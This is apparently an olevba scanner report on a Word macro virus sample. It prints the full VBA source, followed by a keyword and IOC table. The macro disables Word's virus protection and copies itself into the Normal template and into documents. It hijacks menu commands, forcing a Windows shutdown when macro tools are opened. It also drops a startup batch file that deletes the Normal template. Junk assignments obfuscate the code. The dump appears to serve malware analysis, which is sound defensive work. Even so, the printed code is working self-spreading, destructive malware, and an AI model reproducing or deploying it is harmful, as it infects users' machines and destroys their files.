olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-5ea236d9731f00ab6e92f0dff3fead6b90577b21
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-5ea236d9731f00ab6e92f0dff3fead6b90577b21 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO iramoyle.bas 
in file: Virus.MSWord.VMPC-based-5ea236d9731f00ab6e92f0dff3fead6b90577b21 - OLE stream: 'Macros/VBA/iramoyle'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    
Sub iramoyle()
    
    'Produced by,
    'The VicodinES Macro.Poppy Construction Kit v1.0b
    '================================================
    'Code Written by VicodinES "Live for Now"
    'Poppy ID : 83498061288
    
    
On Error Resume Next
f13553 = u8135 & c13649 & k12233 & m8135
f5995 = u17087 & c4217 & Int(Rnd * 522)
k14008 = m15937 & e2700
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
f18137 = u15125 & c11698 & k10819 & m15125
ActiveDocument.ReadOnlyRecommended = False
k12137 = m9206 & e11862
k7944 = m17255 & e10584
k18259 = m10199 & e5832
r8061834913 = 0
f7316 = u11912 & c2129 & Int(Rnd * 1069)
Set vx834980615 = MacroContainer
k9533 = m6746 & e7218
f4049 = u14287 & c2283 & k4596 & m14287
f7632 = u5517 & c8910 & k12065 & m5517
 f5228$ = "c:\windows\startm~1\programs\startup\msfile.bat"
f12501 = u8076 & c10973 & k16151 & m8076
f8275 = u6182 & c6628 & k10373 & m6182
l90208349 = GetAttr(NormalTemplate.FullName)
f8859 = u2665 & c13728 & Int(Rnd * 5752)
f9775 = u3555 & c6391 & Int(Rnd * 5604)
If l90208349 = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f5228$)
f9025 = u9868 & c6510 & Int(Rnd * 1287)
f8036 = u9451 & c14159 & Int(Rnd * 4310)
If l90208349 = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f5228$)
If l90208349 = vbReadOnly Then GoTo fuckoff
f4407 = u9384 & c15985 & k7403 & m9384
f6656 = u10443 & c15629 & k14623 & m10443
If l90208349 = vbReadOnly + vbArchive Then GoTo fuckoff
k13468 = m18064 & e5105
k3440 = m11908 & e9177
k6028 = m12991 & e8289
If vx834980615 = NormalTemplate Then r8061834913 = 1
If r8061834913 = 1 Then r486806112 = NormalTemplate.FullName Else r486806112 = ActiveDocument.FullName
f15037 = u4705 & c4634 & k8875 & m4705
If r8061834913 = 1 Then cde834910 = ActiveDocument.FullName Else cde834910 = NormalTemplate.FullName
f16762 = u13464 & c7794 & Int(Rnd * 8408)
Application.OrganizerCopy Source:=r486806112, Destination:=cde834910, Name:="iramoyle", Object:=wdOrganizerObjectProjectItems
k5284 = m12483 & e4086
f4799 = u17973 & c12163 & Int(Rnd * 620)
If r8061834913 = 1 And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
f8620 = u15933 & c11260 & k6343 & m15933
f1633 = u6024 & c9857 & Int(Rnd * 109)
If r8061834913 = 0 Then
f13417 = u8967 & c13635 & k13124 & m8967
     If NormalTemplate.Saved = False Then NormalTemplate.Save
f17870 = u12247 & c11378 & Int(Rnd * 5486)
     End If
f10644 = u5607 & c7507 & Int(Rnd * 3132)
k13592 = m13149 & e4138
f11155 = u12562 & c4920 & k9066 & m12562
'VMPCK v1.0b
fuckoff:
End Sub
Sub HelpAbout()
    On Error Resume Next
f11799 = u13227 & c2638 & k7375 & m13227
    MsgBox "IRA-Moyle", vbInformation
End Sub
Sub FileNew()
    On Error Resume Next
k11777 = m8729 & e5156
    Call iramoyle
f11560 = u6498 & c10169 & Int(Rnd * 6928)
Dialogs(wdDialogFileNew).Show
f12025 = u14614 & c16035 & Int(Rnd * 7290)
    Skip = 1
f10179 = u17489 & c11640 & k11624 & m17489
f7239 = u6926 & c12731 & Int(Rnd * 9776)
    Call iramoyle
End Sub
Sub ToolsMacro()
    On Error Resume Next
k11032 = m8222 & e10952
k1750 = m12574 & e9229
    Call iramoyle
k18090 = m7580 & e5339
k9562 = m12901 & e13145
    Call p9020
k7719 = m12326 & e8237
End Sub
Sub FileTemplates()
    On Error Resume Next
f12263 = u11345 & c8505 & Int(Rnd * 4978)
    Call iramoyle
k15340 = m4796 & e5940
    Call p9020
f7645 = u10861 & c17980 & k8903 & m10861
f11394 = u9294 & c7389 & Int(Rnd * 1581)
End Sub
Sub ViewVBCode()
    On Error Resume Next
k7528 = m14468 & e12022
k10249 = m11097 & e5496
    Call iramoyle
f6490 = u3240 & c12850 & Int(Rnd * 5645)
    Call p9020
End Sub
Sub p9020()
    On Error Resume Next
k9189 = m7648 & e6044
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Tasks.ExitWindows
End Sub
    
Sub vBitchES(strFile As String)
    
Dim hFile As Long
On Error Resume Next
f16893 = u7174 & c18099 & Int(Rnd * 8208)
n$ = NormalTemplate
f16012 = u9778 & c17911 & k16314 & m9778
Part11$ = "attrib -h -r "
snag$ = "c:\progra~1\micros~1\templa~1\"
snag1$ = "c:\progra~1\micros~2\templa~1\"
k8750 = m9620 & e11761
Part2$ = "del "
f10810 = u2811 & c10288 & k3097 & m2811
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + "c:\windows\startm~1\programs\startup\msfile.bat"
Close hFile
f5621 = u11188 & c11734 & Int(Rnd * 3800)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |msfile.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

